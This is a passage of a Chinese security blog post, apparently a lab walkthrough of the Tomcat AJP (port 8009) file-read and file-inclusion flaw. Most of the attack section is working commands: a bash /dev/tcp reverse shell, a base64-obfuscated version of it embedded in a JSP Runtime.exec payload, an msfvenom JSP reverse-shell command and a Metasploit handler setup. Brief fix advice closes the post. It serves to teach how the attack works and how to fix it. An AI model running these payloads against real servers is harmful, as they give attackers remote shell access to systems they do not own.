+<pre class="line-numbers language-none"><code class="language-none">python2 文件读取.py 192.168.175.191 -p 8009 -f webapps目录下的待读取的文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+
+<pre class="line-numbers language-none"><code class="language-none">python2 文件读取.py 192.168.175.191 -p 8009 -f /WEB-INF/web.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062049.png" alt="1619349894166"></p>
+<p>文件包含RCE </p>
+<p>在线bash payload生成： <a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a> </p>
+<pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/192.168.175.191/8888 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062050.png" alt="1619350245468"></p>
+<pre class="line-numbers language-none"><code class="language-none">bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xOTEvODg4OCAwPiYx}|{base64,-d}|{bash,-i}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p>最终的txt的payload</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;%
+    java.io.InputStream in = Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xOTEvODg4OCAwPiYx}|{base64,-d}|{bash,-i}").getInputStream();
+    int a = -1;
+    byte[] b = new byte[2048];
+    out.print("&lt;pre&gt;");
+    while((a=in.read(b))!=-1){
+        out.println(new String(b));
+    }
+    out.print("&lt;/pre&gt;");
+%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>这边要手动上传上去 </p>
+<p>查看</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo docker ps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062051.png" alt="1619350478774"></p>
+<p>然后开始上传</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo docker cp /home/dayu/Desktop/1.txt 6c80deb9d194:/usr/local/tomcat/webapps/ROOT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p>可以去docker 底层看看</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo docker exec -ti 6c bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062052.png"></p>
+<p>成功传上去了</p>
+<p>开启nc监听 </p>
+<p>具体可以看这里：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_30653631/article/details/93749505?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_v2~rank_aggregation-1-93749505.pc_agg_rank_aggregation&amp;utm_term=Ubuntu%E5%AE%89%E8%A3%85nc&amp;spm=1000.2123.3001.4430">https://blog.csdn.net/qq_30653631/article/details/93749505?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_v2~rank_aggregation-1-93749505.pc_agg_rank_aggregation&amp;utm_term=Ubuntu%E5%AE%89%E8%A3%85nc&amp;spm=1000.2123.3001.4430</a></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062053.png" alt="1619351018857"></p>
+<pre class="line-numbers language-none"><code class="language-none">python2 文件包含.py 192.168.175.191 -p 8009 -f 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062054.png" alt="1619351185840"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062055.png" alt="1619351175429"></p>
+<p>可以看到成功上线了</p>
+<p><strong>可以和War联动是吧 可以和PUT联动</strong></p>
+<h4 id="把shell弹到MSF上"><a href="#把shell弹到MSF上" class="headerlink" title="把shell弹到MSF上"></a>把shell弹到MSF上</h4><p>MSF生成木马</p>
+<p>我这边还是上kali吧  Ubuntu不是很顺手</p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.175.167 LPORT=4444 R &gt; shell.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062056.png" alt="1619351850151"></p>
+<pre class="line-numbers language-none"><code class="language-none">sudo docker cp /home/dayu/Desktop/shell.txt 6c80deb9d194:/usr/local/tomcat/webapps/ROOT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p>去docker底层看看</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062057.png" alt="1619351998810"></p>
+<p>上MSF 开启监听</p>
+<pre class="line-numbers language-none"><code class="language-none">msf6 &gt; use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set payload java/jsp_shell_reverse_tcp
+payload =&gt; java/jsp_shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set lhost 192.168.175.167
+lhost =&gt; 192.168.175.167
+msf6 exploit(multi/handler) &gt; set lport 4444
+lport =&gt; 4444
+msf6 exploit(multi/handler) &gt; exploit -j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>执行文件包含RCE</p>
+<pre class="line-numbers language-none"><code class="language-none">python2 文件包含.py 192.168.175.191 -p 8009 -f shell.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062058.png" alt="1619352574611"></p>
+<p>可以看到已经拿到shell了</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062059.png" alt="1619352504843"></p>
+<p>按shell就可以进来了</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210718062100.png" alt="1619352730021"></p>
+<h4 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h4><p>1、将 Tomcat立即升级到9.0.31、8.5.51或7.0.100版本进行修复<br>2、禁用AJP协议<br>具体方法：</p>
+<p>编辑<code>/conf/server.xml</code>，找到如下行：</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;Connector port="8009"protocol="AJP/1.3" redirectPort="8443" /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>注释或删除</p>
+<p>3、配置 secret来设置AJP协议的认证凭证。</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">每天都要努力哇</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://Redamancy404.github.io/2021/10/28/tomcat/">http://Redamancy404.github.io/2021/10/28/tomcat/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">每天都要努力哇</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Tomcat%E5%B0%8F%E7%BB%93/">
+                                    <span class="chip bg-color">Tomcat小结</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/10/28/thinkphp/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="Thinkphp小结">
+                        
+                        <span class="card-title">Thinkphp小结</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            分享者才是学习中最大的受益者！
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-28
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" class="post-category">
+                                    服务攻防
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Thinkphp%E5%B0%8F%E7%BB%93/">
+                        <span class="chip bg-color">Thinkphp小结</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/10/28/websphere/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="WebSphere小结">
+                        
+                        <span class="card-title">WebSphere小结</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            分享者才是学习中最大的受益者！
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-28
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" class="post-category">
+                                    服务攻防
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/WebSphere%E5%B0%8F%E7%BB%93/">
+                        <span class="chip bg-color">WebSphere小结</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2021</span>
+            
+            <a href="/about" target="_blank">每天都要努力哇</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/Redamancy404/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">179.6k</span>
+            
+            
+            
+            
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/Redamancy404" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+</html>
